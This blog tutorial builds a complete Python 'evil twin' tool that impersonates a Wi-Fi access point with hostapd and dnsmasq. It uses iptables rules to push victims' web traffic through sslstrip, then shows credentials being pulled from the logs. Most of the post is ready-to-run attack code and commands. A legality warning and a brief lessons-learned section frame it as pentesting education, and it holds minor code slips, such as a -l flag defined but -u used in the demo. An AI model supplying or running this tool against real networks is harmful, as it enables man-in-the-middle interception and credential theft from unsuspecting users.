---
layout: post
title: Rogue AP Attacks Part 1 - Evil Twin
categories:
- python
- wireless
- scripting
---

An Evil Twin is a wireless attack that works by impersonating a legitimate wireless access point. So long as the malicious access point has a stronger signal strength than its legitimate counterpart, all devices connected to the target AP will drop and connect to the attacker. The attacker can then act as a router between the connected devices and a network gateway, establishing a man-in-the-middle scenario. With the exception of karma attacks and the use of SDR, this is one of the most effective wireless attacks in practice today. It's also relatively simple to implement, as we're about to see. You can execute these attacks from over a quarter of a mile away with the right equipment.


![evil twin attack]({{ site.baseurl }}images/evil-twin-chart-1.png)

Carrying out an evil twin attack involves using two network interfaces. One interface, which we will refer to as "upstream," is used as the rogue access point. The second interface is used to connect the attacker to an internet gateway. Impersonating an access point is as simple as launching a wireless hotspot with the same ESSID and channel as the target. The attacker can then use iptables to route traffic between the two interfaces, diverting and tampering with traffic as necessary.  

![evil twin attack]({{ site.baseurl }}images/mitm.jpg)

#Prerequisites

There are a few basic ingredients needed to perform the evil twin attack. At a most basic
level, we're going to need a laptop running Linux. I'm using Fedora 22, although you can
use just about any distro you want so long as it supports the drivers for your wireless cards.


We're also going to need a external wireless card to serve as our access point. Any external card capable of running in Master mode will work, although I've had the most success with these:

[TP-Link TL-WN722N](http://www.amazon.com/TP-LINK-TL-WN722N-Wireless-Adapter-External/dp/B002SZEOLG/ref=sr_1_1?s=pc&ie=UTF8&qid=1446340003&sr=1-1&keywords=tp-link+wn722n)

We're also going to need a seperate network interface with which to connect to the internet. For PoC purposes, your laptop's internal wireless or ethernet cards should be sufficient. For an actual attack you'd probably want to use some kind of mobile usb hotspot for maximum tactical flexibility.

Also on our requirements list is the software needed to run our hotspot. We'll be implementing our access point from scratch using Python's Scapy library in later tutorials, but for now we're going to keep things simple and create a wrapper to hostapd.  You can install hostapd in the terminal using your distro's package manager.


Additionally, we need a way of handling dhcp and dns for devices that connect to our access point. For this tutorial we'll be using dnsmasq to do both. Like hostapd, dnsmasq can be installed using your package manager.

Finally, we're going to be using sslstrip2 to bypass SSL encryption and sniff credentials from intercepted traffic. You can install it by running the following commands:

{% highlight bash %}
git clone https://github.com/singe/sslstrip2.git
cd sslstrip2
sudo python setup.py install
{% endhighlight %}

#Project Setup

Now that we have our prerequisites out of the way, let's set up our project. We'll first create a new directory from which to work from, then cd into it:

{% highlight bash %}
mkdir evil_twin && cd !$
{% endhighlight %}

We're then going to create an evil_twin.py file to contain the program's core logic:

{% highlight bash %}
touch evil_twin.py
{% endhighlight %}

Finally, we'll create a utils.py file to contain our utilities and wrapper classes.

{% highlight bash %}
touch utils.py
{% endhighlight %}

We're not not going to be using any pypi packages for this project, so I'm not going to bother with a virtual environment for this tutorial. If you're a python dev and want to use virtualenv, feel free to do so.


# utils.py - packet forwarding

The first thing we need to do is give our script a way to enable packet forwarding at the system level. This will allow us to use our computer as a router between the our victims and our network gateway.

You can enable packet forwarding on your machine by running the following command:

{% highlight bash %}
echo '1' > /proc/sys/net/ipv4/ip_forward
{% endhighlight %}

Linux provides us with an interface, an API if you will, called the proc file system that
gives us access to the kernel's internal data structures. By setting the ip_forward to true,
we tell the kernel that we want packet forwarding turned on. We can disable packet
forwarding much in the same way:

{% highlight bash %}
echo '0' > /proc/sys/net/ipv4/ip_forward
{% endhighlight %}

Let's add two function definitions to our utils.py file to provide our script with this
functionality:

{% highlight python %}

def enable_packet_forwarding():

    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
        fd.write('1')

def disable_packet_forwarding():

    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
        fd.write('0')

{% endhighlight %}


It's pretty straightforward. The code just opens the ip_forward file, and writes either '0' or '1' to it depending on whether we want to enable or disable packet forwarding.

# utils.py - Wrapping iptables

We're going to use iptables to route packets between our network interfaces and manipulate the flow of network traffic. In later posts we'll go over using NFQueue to manage iptables,
but for now we're going to keep it simple and implement a wrapper class. 


Let's first open up utils.py and add the following import statement to the top of the file.

{% highlight python %}
import subprocess
{% endhighlight %}

We then implement a wrapper function to painlessly execute system commands using the
subprocess module.

{% highlight python %}
def bash_command(command):

	command = command.split()
	p = subprocess.Popen(command, stdout=subprocess.PIPE)
	output, err = p.communicate()
{% endhighlight %}

We then define our wrapper class to iptables:

{% highlight python %}
class IPTables(object):

    _instance = None
    
    def __init__(self):
        
        self.running = False
        self.reset()

    @staticmethod
    def get_instance():
        
        if IPTables._instance is None:
            IPTables._instance = IPTables()
        return IPTables._instance
{% endhighlight %}

Our IPTables class is responsible for interacting with the iptables daemon. This means that if we instantiate multiple IPTables objects, they will implicitly have shared state: the state of the iptables daemon itself.  Since dealing with this can be messy, we're going to take the easy way out and only allow one instance of the IPTables class at any given time. We do this by giving the IPTables class an \_instance attribute, which is set to None by default. Instead of calling the constructor to instantiate new IPTables objects, we call a static method named get\_instance(). This static method first checks to see if \_instance is set to None. If \_instance is None, it means that we have not yet instantiated any IPTables objects, so we set \_instance to a new IPTables object.  We then return the sole IPTables instance stored in \_instance. From the calling function, this operation would look like this:

{% highlight python %}
iptables = IPTables.get_instance()
{% endhighlight %}

Next we give our IPtables class a method with which it can route traffic between our two
network interfaces while diverting all http(s) traffic to sslstrip.

{% highlight python %}

    def route_to_sslstrip(self, phys, upstream):

		bash_command('iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' % phys)
	        

		bash_command('iptables --append FORWARD --in-interface %s -j ACCEPT' % upstream)
	
	    bash_command('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
	    bash_command('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000')
	
	    bash_command('iptables -t nat -A POSTROUTING -j MASQUERADE')

{% endhighlight %}

Finally, we want to be able to restore iptables to its default state before and after we
use it. We do this by implementing the following method:

{% highlight python %}
    def reset(self):

        bash_command('iptables -P INPUT ACCEPT')
        bash_command('iptables -P FORWARD ACCEPT')
        bash_command('iptables -P OUTPUT ACCEPT')

        bash_command('iptables --flush')
        bash_command('iptables --flush -t nat')
{% endhighlight %}

Our completed IPTables class should look something like this:

{% highlight python %}
class IPTables(object):

    _instance = None
    
    def __init__(self):
        
        self.running = False
        self.reset()

    @staticmethod
    def get_instance():
        
        if IPTables._instance is None:
            IPTables._instance = IPTables()
        return IPTables._instance

    def route_to_sslstrip(self, phys, upstream):

	    bash_command('iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' % phys)
	    
	    bash_command('iptables --append FORWARD --in-interface %s -j ACCEPT' % upstream)
	
	    bash_command('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
	    bash_command('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000')
	
	    bash_command('iptables -t nat -A POSTROUTING -j MASQUERADE')

    def reset(self):

        bash_command('iptables -P INPUT ACCEPT')
        bash_command('iptables -P FORWARD ACCEPT')
        bash_command('iptables -P OUTPUT ACCEPT')

        bash_command('iptables --flush')
        bash_command('iptables --flush -t nat')
{% endhighlight %}


# utils.py - Wrapping hostapd

Let's open up utils.py once again, and add the following global constants to the top of the file.

{% highlight python %}
HOSTAPD_CONF = '/etc/hostapd/hostapd.conf'
HOSTAPD_DEFAULT_DRIVER = 'nl80211'
HOSTAPD_DEFAULT_HW_MODE = 'g'
{% endhighlight %}

These constants are used as an alternative to hardcoding the path of hostapd's config file, the default network driver, and hardware mode for our upstream interface.

We then define the HostAPD class and deal with shared state.

{% highlight python %}
class HostAPD(object):

    _instance = None
    
    def __init__(self):
        
        self.running = False
        self.conf = HOSTAPD_CONF

    @staticmethod
    def get_instance():
        
        if HostAPD._instance is None:
            HostAPD._instance = HostAPD()
        return HostAPD._instance
{% endhighlight %}

Next we provide wrapper methods that can be used to start and stop the hostapd daemon:

{% highlight python %}

	# continued from above
    def start(self):

        if self.running:
            raise Exception('[Utils] hostapd is already running.')

        self.running = True
        bash_command('hostapd %s' % self.conf)
        time.sleep(2)

    def stop(self):

        if not self.running:
            raise Exception('[Utils] hostapd is not running.')

        bash_command('killall hostapd')
        time.sleep(2)

{% endhighlight %}

In HostAPD.start(), we first ensure that the hostapd daemon is not currently running. If it is, we throw an exception. We then start the hostapd daemon using our wrapper to the subprocess module, passing our config file as an argument. We then tell the script to sleep for two seconds to give hostapd enough time to start. HostAPD.stop() works in a similar fashion.

Finally, we provide an interface to hostapd's config file. We do this by implementing a HostAPD.configure() method. Since HostAPD.configure() relies on the shutil module to create a backup of HostAPD's config file, we first import it at the top of our file.

{% highlight python %}

import shutil

{% endhighlight %}

We then create a new method definition for HostAPD.configure():

{% highlight python %}
	# continued from above
    def configure(self,
            upstream,
            ssid,
            channel,
            driver=HOSTAPD_DEFAULT_DRIVER,
            hw_mode=HOSTAPD_DEFAULT_HW_MODE):

        # make backup of existing configuration file
        shutil.copy(self.conf, '%s.evil_twin.bak' % self.conf)

        with open(self.conf, 'w') as fd:
        
            fd.write('\n'.join([
                'interface=%s' % upstream,
                'driver=%s' % driver,
                'ssid=%s' % ssid,
                'channel=%d' % channel,
                'hw_mode=%s' % hw_mode,
            ]))
{% endhighlight %}

Finally we implement a method that restores hostapd's config file to its previous state.

{% highlight python %}
	# continued from above
    def restore(self):

        shutil.copy('%s.evil_twin.bak' % self.conf, self.conf)
{% endhighlight %}

That's it. Our hostapd wrapper is ready to use. The complete class definition should look like this:

{% highlight python %}
class HostAPD(object):

    _instance = None
    
    def __init__(self):
        
        self.running = False
        self.conf = HOSTAPD_CONF

    @staticmethod
    def get_instance():
        
        if HostAPD._instance is None:
            HostAPD._instance = HostAPD()
        return HostAPD._instance

    def start(self):

        if self.running:
            raise Exception('[Utils] hostapd is already running.')

        self.running = True
        bash_command('hostapd %s' % self.conf)
        time.sleep(2)

    def stop(self):

        if not self.running:
            raise Exception('[Utils] hostapd is not running.')

        bash_command('killall hostapd')
        time.sleep(2)

    def configure(self,
            upstream,
            ssid,
            channel,
            driver=HOSTAPD_DEFAULT_DRIVER,
            hw_mode=HOSTAPD_DEFAULT_HW_MODE):

        # make backup of existing configuration file
        shutil.copy(self.conf, '%s.evil_twin.bak' % self.conf)

        with open(self.conf, 'w') as fd:
        
            fd.write('\n'.join([
                'interface=%s' % upstream,
                'driver=%s' % driver,
                'ssid=%s' % ssid,
                'channel=%d' % channel,
                'hw_mode=%s' % hw_mode,
            ]))

    def restore(self):

        shutil.copy('%s.evil_twin.bak' % self.conf, self.conf)
{% endhighlight %}

# utils.py - Wrapping dnsmasq

Our wrapper to dnsmasq will follow a very similar structure to our hostapd wrapper. We first set the following global constants at the top of our utils.py file to avoid hardcoding the paths to our dnsmasq config and log files.  

{% highlight python %}

DNSMASQ_CONF = '/etc/dnsmasq.conf'
DNSMASQ_LOG = '/var/log/dnsmasq.log'

{% endhighlight %}

We then create our DNSMasq class definition, dealing with shared state in the same way
as before.

{% highlight python %}

class DNSMasq(object):

    _instance = None
    
    def __init__(self):
        
        self.running = False
        self.conf = DNSMASQ_CONF

    @staticmethod
    def get_instance():
        
        if DNSMasq._instance is None:
            DNSMasq._instance = DNSMasq()
        return DNSMasq._instance


{% endhighlight %}

Next we create start() and stop() methods for our DNSMasq class using the service command. The service command is a good choice because it will work on most Linux distros, even if they are running systemd. These method definitions work much in the same way as the ones we created for HostAPD.

{% highlight python %}

	# continued from above
    def start(self):

        if self.running:
            raise Exception('[Utils] dnsmasq is already running.')

        self.running = True
        bash_command('service dnsmasq start')
        time.sleep(2)

    def stop(self):

        if not self.running:
            raise Exception('[Utils] dnsmasq is not running.')

        bash_command('killall dnsmasq')
        time.sleep(2)

{% endhighlight %}

We next create an interface to dnsmasq's config file. The method signature should look
like this.

{% highlight python %}

	# continued from above
    def configure(self,
                upstream,
                dhcp_range,
                dhcp_options=[],
                log_facility=DNSMASQ_LOG,
                log_queries=True):

        # make backup of existing configuration file
        shutil.copy(self.conf, '%s.evil_twin.bak' % self.conf)

        with open(self.conf, 'w') as fd:
        
            fd.write('\n'.join([
                'log-facility=%s' % log_facility,
                'interface=%s' % upstream,
                'dhcp-range=%s' % dhcp_range,
                '\n'.join('dhcp-option=%s' % o for o in dhcp_options),
            ]))
            if log_queries:
                fd.write('\nlog-queries')
{% endhighlight %}

The positional argument, upstream, is set to the network interface serving as our access point. The positional argument dhcp\_range will be set to the range of ip addresses available to hosts that connect to our AP. The keyword argument dhcp\_options takes a list of DHCP Option parameters.

Finally, we finish our DNSMasq class by implementing a DNSMasq.restore() to reset dnsmasq's config file to its previous state.

{% highlight python %}

	# continued from above
	def restore(self):

        shutil.copy('%s.evil_twin.bak' % self.conf, self.conf)

{% endhighlight %}

Our DNSMasq class and utils.py file are now finished, and should look
something like this:

{% highlight python %}

import subprocess
import shutil
import time

HOSTAPD_CONF = '/etc/hostapd/hostapd.conf'
HOSTAPD_DEFAULT_DRIVER = 'nl80211'
HOSTAPD_DEFAULT_HW_MODE = 'g'

DNSMASQ_CONF = '/etc/dnsmasq.conf'


DNSMASQ_LOG = '/var/log/dnsmasq.log'


def bash_command(command):

	command = command.split()
	p = subprocess.Popen(command, stdout=subprocess.PIPE)
	output, err = p.communicate()

def enable_packet_forwarding():

    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
        fd.write('1')

def disable_packet_forwarding():

    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
        fd.write('0')

class IPTables(object):

    _instance = None
    
    def __init__(self):
        
        self.running = False
        self.reset()

    @staticmethod
    def get_instance():
        
        if IPTables._instance is None:
            IPTables._instance = IPTables()
        return IPTables._instance

    def route_to_sslstrip(self, phys, upstream):

	    bash_command('iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' % phys)
	    
	    bash_command('iptables --append FORWARD --in-interface %s -j ACCEPT' % upstream)
	
	    bash_command('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
	    bash_command('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000')
	
	    bash_command('iptables -t nat -A POSTROUTING -j MASQUERADE')

    def reset(self):

        bash_command('iptables -P INPUT ACCEPT')
        bash_command('iptables -P FORWARD ACCEPT')
        bash_command('iptables -P OUTPUT ACCEPT')

        bash_command('iptables --flush')
        bash_command('iptables --flush -t nat')

class HostAPD(object):

    _instance = None
    
    def __init__(self):
        
        self.running = False
        self.conf = HOSTAPD_CONF

    @staticmethod
    def get_instance():
        
        if HostAPD._instance is None:
            HostAPD._instance = HostAPD()
        return HostAPD._instance

    def start(self):

        if self.running:
            raise Exception('[Utils] hostapd is already running.')

        self.running = True
        bash_command('hostapd %s' % self.conf)
        time.sleep(2)

    def stop(self):

        if not self.running:
            raise Exception('[Utils] hostapd is not running.')

        bash_command('killall hostapd')
        time.sleep(2)

    def configure(self,
            upstream,
            ssid,
            channel,
            driver=HOSTAPD_DEFAULT_DRIVER,
            hw_mode=HOSTAPD_DEFAULT_HW_MODE):

        # make backup of existing configuration file
        shutil.copy(self.conf, '%s.evil_twin.bak' % self.conf)

        with open(self.conf, 'w') as fd:
        
            fd.write('\n'.join([
                'interface=%s' % upstream,
                'driver=%s' % driver,
                'ssid=%s' % ssid,
                'channel=%d' % channel,
                'hw_mode=%s' % hw_mode,
            ]))

    def restore(self):

        shutil.copy('%s.evil_twin.bak' % self.conf, self.conf)


class DNSMasq(object):

    _instance = None
    
    def __init__(self):
        
        self.running = False
        self.conf = DNSMASQ_CONF

    @staticmethod
    def get_instance():
        
        if DNSMasq._instance is None:
            DNSMasq._instance = DNSMasq()
        return DNSMasq._instance

    def start(self):

        if self.running:
            raise Exception('[Utils] dnsmasq is already running.')

        self.running = True
        bash_command('service dnsmasq start')
        time.sleep(2)

    def stop(self):

        if not self.running:
            raise Exception('[Utils] dnsmasq is not running.')

        bash_command('killall dnsmasq')
        time.sleep(2)

    def configure(self,
                upstream,
                dhcp_range,
                dhcp_options=[],
                log_facility=DNSMASQ_LOG,
                log_queries=True):

        # make backup of existing configuration file
        shutil.copy(self.conf, '%s.evil_twin.bak' % self.conf)

        with open(self.conf, 'w') as fd:
        
            fd.write('\n'.join([
                'log-facility=%s' % log_facility,
                'interface=%s' % upstream,
                'dhcp-range=%s' % dhcp_range,
                '\n'.join('dhcp-option=%s' % o for o in dhcp_options),
            ]))
            if log_queries:
                fd.write('\nlog-queries')

    def restore(self):

        shutil.copy('%s.evil_twin.bak' % self.conf, self.conf)

{% endhighlight %}

# evil\_twin.py - set\_configs()

Now that we've finished our utils.py file, most the hard work is behind us.
We just need to implement our evil_twin.py driver file using the wrapper classes
we just defined. Let's first import our utils module, the time module, as well as
the ArgumentParser class from argparse.

{% highlight python %}
import utils
import time

from argparse import ArgumentParser
{% endhighlight %}

We then create a function for handing command line arguments and setting our script's
configuration.

{% highlight python %}
def set_configs():


    parser = ArgumentParser()

    parser.add_argument('-l',
                dest='upstream',
                required=True,
                type=str,
                metavar='<interface>',
                help='Use this interface as access point.')

    parser.add_argument('-i',
                dest='phys',
                required=True,
                type=str,
                metavar='<interface>',
                help='Use this interface to connect to network gateway.')

    parser.add_argument('-s',
                dest='ssid',
                required=True,
                type=str,
                metavar='<ssid>',
                help='The ssid of the target ap.')

    parser.add_argument('-c',
                dest='channel',
                required=True,
                type=int,
                metavar='<channel>',
                help='The channel of the target ap.')

    args = parser.parse_args()
    
    return {

        'upstream' : args.upstream,
        'phys' : args.phys,
        'ssid' : args.ssid,
        'channel' : args.channel,
    }
{% endhighlight %}

The function uses the argparse module to parse command line arguments, then returns a dictionary containing important configurations for the script. There is a great tutorial on how to use argparse written by _Tshepang Lekhonkhobe_, which can be found [here](https://docs.python.org/2/howto/argparse.html).

# evil\_twin.py - display\_configs()

We then create a simple function to display the script's current configuration in the
terminal. It accepts a dictionary containing the script's configuration as an argument.

{% highlight python %}
def display_configs(configs):

    print
    print '[+] Access Point interface:', configs['upstream']
    print '[+] Network interface:', configs['phys']
    print '[+] Target AP Name:', configs['ssid']
    print '[+] Target AP Channel:', configs['channel']
    print
{% endhighlight %}

# evil\_twin.py - kill\_daemons()

When our script first begins to run, it's going to need to be able to kill any existing
hostapd and dnsmasq processes to avoid running into problems. We deal with this by implementing the following function.

{% highlight python %}
def kill_daemons():

    print '[*] Killing existing dnsmasq and hostapd processes.'
    print 

    utils.bash_command('killall dnsmasq')
    utils.bash_command('killall hostapd')

    print
    print '[*] Continuing...'

{% endhighlight %}

# evil\_twin.py - main()

We now have everything we need to implement the core logic of our Evil Twin script. Let's 
start out by defining main() at the bottom of our evil_twin.py file.

{% highlight python %}

def main():

	# get configs from command line and display them
    configs = set_configs()
    display_configs(configs)

	# kill existing daemon processes
    kill_daemons()

	# obtain interfaces to iptables, hostapd, and dnsmasq
    hostapd = utils.HostAPD.get_instance()
    iptables = utils.IPTables.get_instance()
    dnsmasq = utils.DNSMasq.get_instance()

{% endhighlight %}

The first thing we do in main() is grab the scripts configs from the command line.  We then kill existing daemon processes and obtain interfaces to hostapd, iptables, and dnsmasq.

We then place our upstream interface into master mode, configuring it to run our wireless access point.

{% highlight python %}

	# continued from above

    # bring up ap interface
    utils.bash_command('ifconfig %s down' % configs['upstream'])
    utils.bash_command('ifconfig %s 10.0.0.1/24 up' % configs['upstream'])
{% endhighlight %}

We then configure dnsmasq to handle dhcp and dns requests on our upstream interface.

{% highlight python %}
	# continued from above
    # configure dnsmasq
    print '[*] Configuring dnsmasq'
    dnsmasq.configure(configs['upstream'],
                    '10.0.0.10,10.0.0.250,12h',
                    dhcp_options=[ '3,10.0.0.1', '6,10.0.0.1' ])
{% endhighlight %}

Once that's out of the way, we enable packet forwarding and configure iptables to act as a malicious router.

{% highlight python %}
	# continued from above
    # enable packet forwarding
    print '[*] Enabling packet forwarding.'
    utils.enable_packet_forwarding()


    print '[*] Configuring iptables to route http traffic to sslstrip'
    iptables.route_to_sslstrip(configs['phys'], configs['upstream'])
{% endhighlight %}

We then write code to launch the dnsmasq and hostapd daemons. We place our code with a try catch block to allow the user to quickly and cleanly kill the script by pressing ctrl+c.

{% highlight python %}
	# continued from above
    try:

        # launch access point
        print '[*] Starting dnsmasq.'
        dnsmasq.start()
        print '[*] Starting hostapd.'
        hostapd.start()

    except KeyboardInterrupt:

        print '\n\n[*] Exiting on user command.'

{% endhighlight %}

Finally, we write code to clean up our mess as the script exits.  We also add a call to main() at the bottom of the file.

{% highlight python %}

	# continued from above
    
    # restore everything
    print '[*] Stopping dnsmasq.'
    dnsmasq.stop()
    print '[*] Stopping hostapd.'
    hostapd.stop()


    print '[*] Restoring iptables.'
    iptables.reset()

    print '[*] Disabling packet forwarding.'
    utils.disable_packet_forwarding()

if __name__ == '__main__':
    main()

{% endhighlight %}

# evil\_twin.py - the finished script

Our finished evil_twin.py file is now ready to run, and should look something like this.

{% highlight python %}
import utils
import time

from argparse import ArgumentParser

def set_configs():


    parser = ArgumentParser()

    parser.add_argument('-l',
                dest='upstream',
                required=True,
                type=str,
                metavar='<interface>',
                help='Use this interface as access point.')

    parser.add_argument('-i',
                dest='phys',
                required=True,
                type=str,
                metavar='<interface>',
                help='Use this interface to connect to network gateway.')

    parser.add_argument('-s',
                dest='ssid',
                required=True,
                type=str,
                metavar='<ssid>',
                help='The ssid of the target ap.')

    parser.add_argument('-c',
                dest='channel',
                required=True,
                type=int,
                metavar='<channel>',
                help='The channel of the target ap.')

    args = parser.parse_args()
    
    return {

        'upstream' : args.upstream,
        'phys' : args.phys,
        'ssid' : args.ssid,
        'channel' : args.channel,
    }

def display_configs(configs):

    print
    print '[+] Access Point interface:', configs['upstream']
    print '[+] Network interface:', configs['phys']
    print '[+] Target AP Name:', configs['ssid']
    print '[+] Target AP Channel:', configs['channel']
    print

def kill_daemons():

    print '[*] Killing existing dnsmasq and hostapd processes.'
    print 

    utils.bash_command('killall dnsmasq')
    utils.bash_command('killall hostapd')

    print
    print '[*] Continuing...'


def main():

    configs = set_configs()
    display_configs(configs)
    kill_daemons()

    hostapd = utils.HostAPD.get_instance()
    iptables = utils.IPTables.get_instance()
    dnsmasq = utils.DNSMasq.get_instance()

    # bring up ap interface
    utils.bash_command('ifconfig %s down' % configs['upstream'])
    utils.bash_command('ifconfig %s 10.0.0.1/24 up' % configs['upstream'])

    # configure dnsmasq
    print '[*] Configuring dnsmasq'
    dnsmasq.configure(configs['upstream'],
                    '10.0.0.10,10.0.0.250,12h',
                    dhcp_options=[ '3,10.0.0.1', '6,10.0.0.1' ])

    # configure hostpad
    print '[*] Configuring hostapd'
    hostapd.configure(configs['upstream'],
                    configs['ssid'],
                    configs['channel'])

    # enable packet forwarding
    print '[*] Enabling packet forwarding.'
    utils.enable_packet_forwarding()


    print '[*] Configuring iptables to route packets to sslstrip'
    iptables.route_to_sslstrip(configs['phys'], configs['upstream'])

    try:

        # launch access point
        print '[*] Starting dnsmasq.'
        dnsmasq.start()
        print '[*] Starting hostapd.'
        hostapd.start()

    except KeyboardInterrupt:

        print '\n\n[*] Exiting on user command.'


    
    # restore everything
    print '[*] Stopping dnsmasq.'
    dnsmasq.stop()
    print '[*] Stopping hostapd.'
    hostapd.stop()


    print '[*] Restoring iptables.'
    iptables.reset()

    print '[*] Disabling packet forwarding.'
    utils.disable_packet_forwarding()

if __name__ == '__main__':
    main()

{% endhighlight %}

# Demo - evil\_twin.py

Let's test our new script and see what it's capable of. In this demo we will attack an open wireless network served using a Buffalo router running DD-WRT, with a single mobile phone connected as a client. Please note that it is highly illegal and ill advised to even attempt this kind of attack on networks and hardware that you do not own. I'm using my own router and my own cell phone for this demo, and I strongly suggest you do the same if this is something you're interested in trying. Also, just because it is legal to steal your own creds on your own network does not mean it is legal to steal them by attacking the servers that those creds came from. It goes without saying that you should not do this without permission under any circumstances.

## Setting up the attack

The first thing we need to do is disable NetworkManager on our own machine. We do this by running the following commands.

{% highlight bash %}

# debian / kali
sudo /etc/init.d/network-manager stop
sudo update-rc.d network-manager remove 

# ubuntu / mint
sudo stop network-manager
echo "manual" | sudo tee /etc/init/network-manager.override 

# centos / fedora / rhel 
sudo systemctl stop NetworkManager.service
sudo systemctl disable NetworkManager.service 

{% endhighlight %}

We then need to connect our gateway interface to some network other than the one we are attacking. I'm connecting to my home wifi network using wpa_supplicant, but it might be a bit easier to connect using your ethernet interface. All the info you need to do this can be found [here](http://unix.stackexchange.com/questions/92799/connecting-to-wifi-network-through-command-line).


Once you connect, you will need to need to run the following commands to obtain an IP lease:

{% highlight bash %}

killall dhclient
dhclient <gateway interface>

{% endhighlight %}

Once we've set up our gateway interface, we need to obtain the ESSID and channel of the access point we are currently attacking. We can do this by running the following commands and analyzing the output.

{% highlight bash %}
# make sure our upstream interface is in managed mode
ifconfig <upstream interface> down
iwconfig <upstream interface> mode managed
ifconfig <upstream interface> up

# scan with iwlist and pipe results into less
iwlist <upstream interface> scan | less
{% endhighlight %}


We then want to open up a new terminal and run our installation of sslstrip by using

{% highlight bash %}
	sslstrip -l 10000 -a -w <path to output file>
{% endhighlight %}

The output of the command should look something like this.

![Launching sslstrip]({{ site.baseurl }}images/sslstrip-launch.png)

We then want to open another terminal and use the tail command to display the output of
sslstrip from its output file in real time.

![sslstrip log]({{ site.baseurl }}images/sslstrip-log.png)

The syntax for doing this is as follows:

{% highlight bash %}
	tail -f <path to sslstript output file from previous step>
{% endhighlight %}


Finally, we need a way of knowing when client devices connect to our access point.

![dnsmasq log]({{ site.baseurl }}images/dnsmasq-log.png)

We can do this by watching dhcp leases using the following technique.

{% highlight bash %}
tail -f /var/log/dnsmasq.log | grep dnsmasq-dhcp
{% endhighlight %}

## Launching the attack

To launch our attack, we simply run our evil_twin.py script as shown below.

![Launching the AP]({{ site.baseurl }}images/launch-ap.png)

The exact syntax for doing this is

{% highlight bash %}
	python evil_twin.py -u <upstream interface> -i <gateway interface> -s <essid> -c <channel>
{% endhighlight %}

You should now see the devices associated with the taret network drop from the AP we just attacked, then connect to you instead. This output will come from your filtered dnsmasq log file, as shown below.

![Launching the AP]({{ site.baseurl }}images/dnsmasq-lease.png)

We have now established ourselves as a man-in-the-middle between the target devices and
our network gateway, and can begin sniffing traffic.

## Stealing creds for sites with no encryption

We're only going to focus on sniffing http and https traffic for login
credentials. It's definitely possible sniff other protocols, but a bit out of the scope
of this tutorial. The traffic that we can successfully sniff using our current setup
falls into two basic categories: unencrypted http traffic, and https traffic with weak
encryption. Defeating stronger encryption will be addressed later tutorials.

Let's start out by showing how to harvest creds from unencrypted http traffic. To do this
I'm first going to log into my account at hackru.org from my hacked cell phone as show below.

![weak encryption phone]({{ site.baseurl }}images/no-encryption-phone.png)

I'm then going to quickly parse the contents of my sslstrip output file using grep, revealing my login info.

![no encryption attacker]({{ site.baseurl }}images/no-encryption-attacker.png)

It's a simple approach, yet frighteningly effective.

## Stealing creds for sites with weaksauce encryption

Now that we've shown how to sniff creds from unencrypted http traffic, let's go over how to sniff creds from weakly encrypted web traffic. To do this I'm going to log into my Hacker League account from my hacked cell phone.

![weak encryption phone]({{ site.baseurl }}images/weak-encryption-phone.png)

I'm then going to steal my own creds using the same approach as before.

![weak encryption attacker]({{ site.baseurl }}images/weak-encryption-attacker.png)

Once again, this is surprisingly easy to do if you have the right tools.

## Lessons learned

Hopefully we've learned some valuable lessons here, aside from how to build wireless auditing tools and learning basic network pentesting techniques.  From a user's perspective, we've learned how important it is to be careful about the traffic we send over open networks. From the perspective of an engineer, we've hopefully learned to appreciate the importance of implenting strong encryption when handling sensitive transactions.
